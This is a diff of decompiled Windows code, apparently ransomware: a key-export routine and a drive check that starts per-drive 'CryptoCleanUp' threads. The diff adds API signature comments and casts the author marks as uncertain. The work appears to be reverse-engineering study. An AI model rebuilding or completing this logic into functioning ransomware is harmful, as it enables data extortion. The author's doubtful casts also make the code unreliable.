@@ -882,9 +882,30 @@ HLOCAL  CryptoExportKey(int a1) // This looks to me like it takes in struct and 
 	v7 = 0;
 	v3 = *(a1 + 20);// 5th item from struct. 
 	pdwDataLen = 0;
+	/*
+	BOOL CryptExportKey(
+  HCRYPTKEY hKey,
+  HCRYPTKEY hExpKey,
+  DWORD     dwBlobType,
+  DWORD     dwFlags,
+  BYTE      *pbData,
+  DWORD     *pdwDataLen
+);
+
+_In_                                            HCRYPTKEY   hKey,
+_In_                                            HCRYPTKEY   hExpKey,
+_In_                                            DWORD   dwBlobType,
+_In_                                            DWORD   dwFlags,
+_Out_writes_bytes_to_opt_(*pdwDataLen, *pdwDataLen) BYTE    *pbData,
+_Inout_                                         DWORD   *pdwDataLen
+
+	*/
+
+
+
 	if (CryptExportKey(v3, v2, 1u, 0, 0, &pdwDataLen))
 	{
-		v4 = LocalAlloc(0x40u, pdwDataLen);
+		v4 = (BYTE*)LocalAlloc(0x40u, pdwDataLen); // Might work.
 		pbBinary = v4;
 		if (v4)
 		{
@@ -893,7 +914,7 @@ HLOCAL  CryptoExportKey(int a1) // This looks to me like it takes in struct and 
 				pcchString = 0;
 				if (CryptBinaryToStringW(pbBinary, pdwDataLen, 1u, 0, &pcchString))
 				{
-					v5 = LocalAlloc(0x40u, 2 * pcchString);
+					v5 = (LPWSTR)LocalAlloc(0x40u, 2 * pcchString); // Not sure if this is correct
 					if (v5)
 					{
 						if (CryptBinaryToStringW(pbBinary, pdwDataLen, 1u, v5, &pcchString))
@@ -1068,6 +1089,16 @@ HANDLE  CheckDriveAndPubKey() // returns thread handle
 					*buff = *RootPathName;
 					buff[1] = v4;
 					result = CreateThread(0, 0, CryptoCleanUp, buff, 0, 0);
+					/*
+					    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
+						_In_ SIZE_T dwStackSize,
+						_In_ LPTHREAD_START_ROUTINE lpStartAddress,
+						_In_opt_ __drv_aliasesMem LPVOID lpParameter,
+						_In_ DWORD dwCreationFlags,
+						_Out_opt_ LPDWORD lpThreadId
+					*/
+
+
 				}
 			}
 		}
